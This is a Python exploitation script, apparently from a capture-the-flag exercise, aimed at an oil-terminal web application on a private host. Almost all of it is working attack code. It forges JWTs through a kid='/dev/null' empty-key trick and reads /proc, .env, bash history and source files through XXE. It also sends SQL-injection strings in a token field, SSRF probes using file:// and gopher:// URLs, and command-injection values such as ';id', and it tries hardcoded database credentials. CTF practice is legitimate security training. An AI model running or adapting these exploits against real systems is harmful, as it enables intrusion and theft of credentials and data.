#!/usr/bin/env python3
"""round72b — Continuation: /proc/fd (fixed), maps, net/tcp, DB, templates, API scan"""
import requests, json, time, hashlib, hmac as hm, base64, socket, re, struct

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", sub="ctf", company="X", kid="/dev/null", key=b''):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

def xxe_read(path, field="remarks", timeout=10):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = requests.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=timeout)
        if r.status_code == 200:
            data = json.loads(r.text)
            return 200, data.get("summary", data.get("ticket", {})).get(field, "")
        return r.status_code, r.text
    except requests.exceptions.Timeout:
        return -1, "TIMEOUT"
    except Exception as e:
        return -2, str(e)

# ============================================================
print("="*70)
print("PHASE 1: /proc/self/fd/* (skip 0,1,2 — pipes/stdin)")
print("="*70)

for fd in range(3, 20):
    code, val = xxe_read(f"/proc/self/fd/{fd}", timeout=3)
    if code == 200 and val:
        print(f"  fd/{fd} ({len(val)} bytes): {val[:300]}")
    elif code == 400:
        print(f"  fd/{fd}: EXISTS (binary/special)")
    elif code == -1:
        print(f"  fd/{fd}: TIMEOUT (pipe/socket)")
    # else: doesn't exist or error — skip

# PID 1 fds
for fd in range(3, 15):
    code, val = xxe_read(f"/proc/1/fd/{fd}", timeout=3)
    if code == 200 and val:
        print(f"  PID1/fd/{fd} ({len(val)} bytes): {val[:300]}")
    elif code == 400:
        print(f"  PID1/fd/{fd}: EXISTS (binary/special)")
    elif code == -1:
        print(f"  PID1/fd/{fd}: TIMEOUT (pipe/socket)")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: /proc/self/maps + net/tcp (memory + connections)")
print("="*70)

for path in ["/proc/self/maps", "/proc/self/net/tcp", "/proc/self/net/tcp6",
             "/proc/self/net/unix"]:
    code, val = xxe_read(path, timeout=8)
    if code == 200 and val:
        lines = val.split('\n')
        print(f"\n  {path} ({len(val)} bytes, {len(lines)} lines):")
        for line in lines[:30]:
            print(f"    {line}")
        if len(lines) > 30:
            print(f"    ... ({len(lines)-30} more lines)")

        # For net/tcp, decode addresses
        if 'net/tcp' in path:
            print(f"\n    --- Decoded connections ---")
            for line in lines[1:]:
                parts = line.split()
                if len(parts) >= 4:
                    try:
                        local = parts[1]
                        remote = parts[2]
                        state = parts[3]
                        laddr, lport = local.split(':')
                        raddr, rport = remote.split(':')
                        # Decode hex IP (little-endian)
                        lip = '.'.join(str(int(laddr[i:i+2], 16)) for i in [6,4,2,0])
                        lp = int(lport, 16)
                        rip = '.'.join(str(int(raddr[i:i+2], 16)) for i in [6,4,2,0])
                        rp = int(rport, 16)
                        states = {
                            '01':'ESTABLISHED','02':'SYN_SENT','03':'SYN_RECV',
                            '04':'FIN_WAIT1','05':'FIN_WAIT2','06':'TIME_WAIT',
                            '07':'CLOSE','08':'CLOSE_WAIT','09':'LAST_ACK',
                            '0A':'LISTEN','0B':'CLOSING'
                        }
                        st = states.get(state, state)
                        print(f"      {lip}:{lp} → {rip}:{rp} ({st})")
                    except:
                        pass
    elif code == 400:
        print(f"  {path}: EXISTS (special chars)")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: /services ENDPOINT")
print("="*70)

try:
    r = requests.get(f"{CASPI}/services", timeout=5)
    print(f"  [{r.status_code}] ({len(r.text)} bytes)")
    # Extract main content
    main = re.search(r'<main>(.*?)</main>', r.text, re.DOTALL)
    if main:
        clean = re.sub(r'<[^>]+>', '\n', main.group(1))
        clean = re.sub(r'\n{2,}', '\n', clean).strip()
        print(clean[:2000])
    else:
        print(r.text[:2000])
except Exception as e:
    print(f"  Error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: DIRECT POSTGRESQL CONNECTION")
print("="*70)

# Try psycopg2
try:
    import psycopg2
    print("  psycopg2 available!")
    for host_try in [HOST, "172.18.0.3"]:
        try:
            conn = psycopg2.connect(
                host=host_try, port=5432,
                user="terminal_web", password="terminal_web_pw",
                database="terminal", connect_timeout=3
            )
            print(f"  *** CONNECTED to {host_try}! ***")
            cur = conn.cursor()
            cur.execute("SELECT table_name FROM information_schema.tables WHERE table_schema='public'")
            print(f"  Tables: {[t[0] for t in cur.fetchall()]}")
            conn.close()
            break
        except Exception as e:
            print(f"  {host_try}: {e}")
except ImportError:
    print("  psycopg2 not available, trying raw socket...")

# Raw socket test
for host_try, desc in [(HOST, "via VPN"), ("172.18.0.3", "Docker internal")]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        result = s.connect_ex((host_try, 5432))
        if result == 0:
            print(f"  *** {desc} ({host_try}:5432): PORT OPEN! ***")
        else:
            print(f"  {desc} ({host_try}:5432): closed ({result})")
        s.close()
    except Exception as e:
        print(f"  {desc}: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: SQLi VIA JWT COMPANY FIELD → PORTAL")
print("="*70)
print("  Forge JWT with SQLi in company → portal queries DB with it")

sqli_companies = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' UNION SELECT 1,2,3,4,5,6,7--",
    "' UNION SELECT table_name,2,3,4,5,6,7 FROM information_schema.tables--",
    "' UNION SELECT current_setting('server_version'),2,3,4,5,6,7--",
    "CTF_Team_fubznz' OR 1=1--",
    "1; SELECT pg_read_file('/proc/self/environ')--",
]

for sqli in sqli_companies:
    S = requests.Session()
    S.cookies.set("session", jwt_forged(role="carrier", sub="6077",
                                         company=sqli, kid="/dev/null"))
    try:
        r = S.get(f"{CASPI}/portal", timeout=5)
        # Look for different content (more/less rows, errors, data leak)
        main = re.search(r'<main>(.*?)</main>', r.text, re.DOTALL)
        if main:
            clean = re.sub(r'<[^>]+>', ' ', main.group(1))
            clean = re.sub(r'\s+', ' ', clean).strip()
            # Check if it differs from normal
            if "No loading windows" not in clean or len(clean) > 500:
                print(f"  company='{sqli[:40]}': DIFFERENT! ({len(clean)} chars)")
                print(f"    {clean[:500]}")
            else:
                print(f"  company='{sqli[:40]}': same (no injection)")
        else:
            if r.status_code != 200:
                print(f"  company='{sqli[:40]}': [{r.status_code}] {r.text[:200]}")
    except Exception as e:
        print(f"  Error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: PROBE ERROR MESSAGES")
print("="*70)

tests = [
    ({}, "empty body"),
    ({"url": "", "sig": ""}, "empty strings"),
    ({"url": "x", "sig": "y"}, "garbage"),
    ({"url": "http://gauge-gw.internal:9100/v1/tanks/1/level",
      "sig": "wrong"}, "correct URL, wrong sig"),
    ({"url": "http://gauge-gw.internal:9100/v1/tanks/1/level",
      "sig": "0"*64}, "correct URL, zero sig"),
    ({"url": "http://127.0.0.1:3000/", "sig": "a"*64}, "localhost SSRF"),
    ({"url": "http://172.18.0.3:5432/", "sig": "b"*64}, "DB SSRF"),
    ({"url": "file:///etc/passwd", "sig": "c"*64}, "file protocol"),
    ({"url": "gopher://127.0.0.1:5432/", "sig": "d"*64}, "gopher"),
]

for tc, desc in tests:
    try:
        r = requests.post(f"{CASPI}/api/ops/probe", json=tc,
                         headers=AUTH_OP, timeout=5)
        print(f"  {desc}: [{r.status_code}] {r.text[:200]}")
    except Exception as e:
        print(f"  {desc}: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: ALL API ENDPOINTS SCAN")
print("="*70)

endpoints = [
    "/api/ops", "/api/ops/custody", "/api/ops/custody/list",
    "/api/ops/tanks", "/api/ops/tanks/1", "/api/ops/tanks/1/level",
    "/api/ops/meters", "/api/ops/meters/loading-arm-1",
    "/api/ops/devices", "/api/ops/status", "/api/ops/config",
    "/api/ops/flow", "/api/ops/loading", "/api/ops/schedule",
    "/api/ops/dispatch", "/api/ops/probe/devices",
    "/api/ops/probe/list", "/api/ops/probe/config",
    "/api/ops/probe/secret", "/api/ops/probe/key",
    "/api/auth", "/api/auth/me", "/api/auth/users",
    "/api/auth/profile", "/api/auth/reset",
    "/api/admin", "/api/admin/config", "/api/admin/users",
    "/api/admin/probe", "/api/admin/secret",
    "/api/internal", "/api/debug",
    "/api/health", "/api/healthz", "/api/info", "/api/version",
    "/api/env", "/api/config", "/api/flag", "/api/secret",
    "/api/shell", "/api/llehs",
    "/health", "/healthz", "/status", "/info",
    "/debug", "/config", "/env", "/flag", "/shell", "/llehs",
    "/console", "/_debug", "/favicon.ico",
    "/robots.txt", "/sitemap.xml",
    # index/home/login pages
    "/", "/index", "/home", "/login", "/register",
    # Path traversal attempts
    "/api/ops/probe/sign?device=../../../etc/passwd",
    "/api/ops/probe/sign?device=;id",
    "/api/ops/probe/sign?device=|id",
    "/api/ops/probe/sign?device=`id`",
]

for path in endpoints:
    try:
        r = requests.get(f"{CASPI}{path}", headers=AUTH_OP,
                        timeout=3, allow_redirects=False)
        if r.status_code not in [404]:
            body = r.text[:150].replace('\n', ' ')
            print(f"  [{r.status_code}] {path}: {body}")
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: TEMPLATES WITH FIXED EXTRACTION")
print("="*70)

templates = [
    "/app/templates/portal.html",
    "/app/templates/error.html",
    "/app/templates/base.html",
    "/app/templates/index.html",
    "/app/templates/login.html",
    "/app/templates/register.html",
    "/app/templates/services.html",
    "/app/templates/loading.html",
    "/app/templates/custody.html",
    "/app/templates/probe.html",
    "/app/templates/admin.html",
    "/app/templates/dashboard.html",
    "/app/templates/tanks.html",
    "/app/templates/meters.html",
    "/app/templates/devices.html",
]

for path in templates:
    code, val = xxe_read(path, timeout=5)
    if code == 200 and val:
        print(f"\n  {path} ({len(val)} bytes):")
        print(f"    {val[:500]}")
        if len(val) > 500:
            print(f"    ... ({len(val)-500} more)")
        # Look for interesting patterns
        apis = re.findall(r'/api/[a-zA-Z0-9/_?&=.-]+', val)
        if apis: print(f"    APIs found: {apis}")
        if 'safe' in val.lower() or 'markup' in val.lower():
            print(f"    *** UNSAFE RENDERING FLAG ***")
    elif code == 400:
        print(f"  {path}: EXISTS (has HTML tags → 400)")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: CREATIVE — READ /proc/self/environ alternatives")
print("="*70)

# /proc/self/environ has null bytes → can't read directly
# But some Docker images write env to files
alt_environ = [
    "/etc/environment",
    "/etc/default/locale",
    "/etc/profile.d/python.sh",
    "/etc/profile",
    "/root/.bashrc",
    "/root/.profile",
    "/root/.bash_history",
    # Docker env files
    "/.dockerenv",
    "/.env",
    "/app/.env",
    "/app/.env.local",
    "/app/.env.production",
    # Supervisord or other process managers
    "/etc/supervisor/conf.d/app.conf",
    "/etc/supervisord.conf",
    # Systemd
    "/etc/systemd/system/app.service",
    # Docker entrypoint might source env
    "/docker-entrypoint.sh",
    "/entrypoint.sh",
    "/start.sh",
    "/run.sh",
    # Python site-packages might have something
    "/usr/local/lib/python3.11/site-packages/pip/_vendor/certifi/cacert.pem",
    # Gunicorn temp
    "/tmp/.gunicorn_pid",
]

for path in alt_environ:
    code, val = xxe_read(path, timeout=3)
    if code == 200 and val:
        print(f"  *** {path} ({len(val)} bytes): {val[:300]} ***")
    elif code == 400:
        print(f"  {path}: EXISTS (binary/special)")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 10: KID ORACLE — TEST IF CARRIER KEY = PROBE_SECRET")
print("="*70)
print("  Use session cookie JWT to test if /app/keys/carrier content")
print("  is the same as PROBE_SECRET")
print()
print("  We have: HMAC(carrier_key, session_unsigned) = session_sig")
print("  We want: HMAC(carrier_key, probe_url) =? probe_sig")
print("  If equal: carrier_key == PROBE_SECRET")
print()
print("  Can't test directly, but can try an indirect approach:")
print("  1) Forge JWT with kid=/app/keys/carrier")
print("  2) JWT unsigned = known value")
print("  3) If server returns 200, we know the sig matches carrier_key")
print()

# We know the session cookie JWT:
# Header: {"alg":"HS256","typ":"JWT","kid":"carrier"}
# Payload: {"sub":6077,"company":"CTF_Team_fubznz","role":"carrier",...}
# Sig: RWp3WB6MqNfCIByBaDq7EVoZwhb5L8DU1sSqAZ1CvLQ
#
# The app reads /app/keys/carrier to verify JWTs with kid="carrier"
# If we use kid="/app/keys/carrier" (full path), does it work?

session_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImNhcnJpZXIifQ.eyJzdWIiOjYwNzcsImNvbXBhbnkiOiJDVEZfVGVhbV9mdWJ6bnoiLCJyb2xlIjoiY2FycmllciIsImlhdCI6MTc5MDc1NDIwMSwiZXhwIjoxNzkwODQwNjAxfQ.RWp3WB6MqNfCIByBaDq7EVoZwhb5L8DU1sSqAZ1CvLQ"

# Try using the session JWT as-is
try:
    r = requests.get(f"{CASPI}/api/auth/me",
                    headers={"Authorization": f"Bearer {session_jwt}"}, timeout=5)
    print(f"  Session JWT via Bearer: [{r.status_code}] {r.text[:200]}")
except Exception as e:
    print(f"  Error: {e}")

# Now construct a JWT with kid="/app/keys/carrier" that uses
# the SAME unsigned data as the session JWT, but with kid changed
# The header would be different → different unsigned data → different sig needed
# So this doesn't directly work.

# BUT: what if "carrier" resolves to "/app/keys/carrier" in the app?
# Then kid="carrier" → reads /app/keys/carrier
# And kid="/app/keys/carrier" → reads /app/keys/carrier (same!)
# Let's verify:

# Try sending a JWT with kid="/app/keys/carrier" using the session JWT's
# payload but recomputed header (kid changed)
# We need to sign with the carrier key content... which we don't know.

# Alternative: change the session JWT's kid WITHOUT changing the signature
# If we can modify the header to kid="/app/keys/carrier" but keep same sig,
# the server would:
# 1. Parse new header → kid="/app/keys/carrier"
# 2. Read /app/keys/carrier (same file!)
# 3. Verify HMAC(carrier_key, new_header.old_payload) =? old_sig
# 4. Since header changed, the unsigned data changed, so HMAC differs → 403

# This won't work. The kid is part of the header which is part of the signed data.

# Let me try something else: can I make the app TELL me which file
# corresponds to kid="carrier"?

# Try kid values to find the path pattern
kid_paths = [
    "carrier",               # Original (works for session)
    "/app/keys/carrier",     # Full path
    "keys/carrier",          # Relative
    "./keys/carrier",        # Relative with dot
    "../keys/carrier",       # Up one level
    "../../app/keys/carrier",
]

for kid in kid_paths:
    # Forge JWT with this kid and sign with empty key
    token = jwt_forged(role="operator", kid=kid, key=b'')
    try:
        r = requests.get(f"{CASPI}/api/auth/me",
                        headers={"Authorization": f"Bearer {token}"}, timeout=3)
        print(f"  kid='{kid}': [{r.status_code}]")
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 11: READ /proc/self/net/tcp + DECODE ALL CONNECTIONS")
print("="*70)

code, val = xxe_read("/proc/self/net/tcp", timeout=8)
if code == 200 and val:
    lines = val.strip().split('\n')
    print(f"  {len(lines)-1} connections:")
    for line in lines[1:]:
        parts = line.split()
        if len(parts) >= 4:
            try:
                local = parts[1]
                remote = parts[2]
                state = parts[3]
                laddr, lport = local.split(':')
                raddr, rport = remote.split(':')
                lip = '.'.join(str(int(laddr[i:i+2], 16)) for i in [6,4,2,0])
                lp = int(lport, 16)
                rip = '.'.join(str(int(raddr[i:i+2], 16)) for i in [6,4,2,0])
                rp = int(rport, 16)
                states = {
                    '01':'ESTAB','02':'SYN_SENT','03':'SYN_RECV',
                    '04':'FIN_WAIT1','05':'FIN_WAIT2','06':'TIME_WAIT',
                    '07':'CLOSE','08':'CLOSE_WAIT','09':'LAST_ACK',
                    '0A':'LISTEN','0B':'CLOSING'
                }
                st = states.get(state, state)
                print(f"    {lip}:{lp} → {rip}:{rp} [{st}]")
            except:
                pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 12: XXE WITH PARAMETER ENTITIES — CDATA WRAPPER")
print("="*70)
print("  Try to read app.py by wrapping entity in CDATA section")
print("  This requires parameter entities — may not work in lxml")

# Approach 1: Internal parameter entity to wrap in CDATA
# This is known to NOT work in most parsers (can't use PE in internal subset
# to create general entities). But worth trying.

cdata_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % file SYSTEM "file:///app/app.py">
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % end "]]>">
  <!ENTITY % wrapper "<!ENTITY content '%start;%file;%end;'>">
  %wrapper;
]>
<ticket>
  <reference>&content;</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>R</remarks>
</ticket>'''

try:
    r = requests.post(f"{CASPI}/api/ops/custody/ingest",
        data=cdata_xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=10)
    print(f"  CDATA wrapper: [{r.status_code}] {r.text[:500]}")
except Exception as e:
    print(f"  Error: {e}")

# Approach 2: Direct CDATA section (entities NOT expanded in CDATA)
# This is a control test — should just echo the entity reference as text
cdata_xml2 = '''<?xml version="1.0" encoding="UTF-8"?>
<ticket>
  <reference><![CDATA[test_cdata]]></reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>R</remarks>
</ticket>'''

try:
    r = requests.post(f"{CASPI}/api/ops/custody/ingest",
        data=cdata_xml2, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=5)
    print(f"  CDATA direct: [{r.status_code}] {r.text[:300]}")
except Exception as e:
    print(f"  Error: {e}")

# Approach 3: Use UTF-16 encoding to bypass XML special chars
# If the file is read as UTF-16, < (0x3C) might be part of a multi-byte char
utf16_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY x SYSTEM "file:///app/app.py">
]>
<ticket>
  <reference>&x;</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>R</remarks>
</ticket>'''

try:
    # Send as UTF-16 to see if encoding affects entity parsing
    r = requests.post(f"{CASPI}/api/ops/custody/ingest",
        data=utf16_xml.encode('utf-8'),
        headers={**AUTH_OP, "Content-Type":"application/xml; charset=utf-8"}, timeout=10)
    print(f"  UTF-8 app.py: [{r.status_code}] {r.text[:300]}")
except Exception as e:
    print(f"  Error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 13: PROBE — ALTERNATIVE URL FORMATS")
print("="*70)
print("  Test if probe accepts URLs with query params or fragments")

# These are all signed → won't work unless server normalizes
# But test with known signed URLs first
probe_url = "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
probe_sig = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"

# Test normal probe
try:
    r = requests.post(f"{CASPI}/api/ops/probe", json={"url": probe_url, "sig": probe_sig},
                     headers=AUTH_OP, timeout=5)
    print(f"  Normal: [{r.status_code}] {r.text[:200]}")
except Exception as e:
    print(f"  Error: {e}")

# What if we add extra fields?
extra_tests = [
    {"url": probe_url, "sig": probe_sig, "method": "POST"},
    {"url": probe_url, "sig": probe_sig, "headers": {"X-Custom": "test"}},
    {"url": probe_url, "sig": probe_sig, "follow_redirects": False},
    {"url": probe_url, "sig": probe_sig, "timeout": 1},
    {"url": probe_url, "sig": probe_sig, "body": "test"},
    {"url": probe_url, "sig": probe_sig, "data": "test"},
]

for extra in extra_tests:
    try:
        r = requests.post(f"{CASPI}/api/ops/probe", json=extra,
                         headers=AUTH_OP, timeout=5)
        if r.text != '{"body":"{\\"flow_m3h\\":346.1,\\"meter\\":\\"loading-arm-1\\",\\"totalizer_m3\\":307919.0}\\n","status":200}\n':
            extra_keys = [k for k in extra.keys() if k not in ['url','sig']]
            print(f"  Extra {extra_keys}: [{r.status_code}] {r.text[:200]}")
    except:
        pass

print("\n"+"="*70)
print("DONE")
print("="*70)
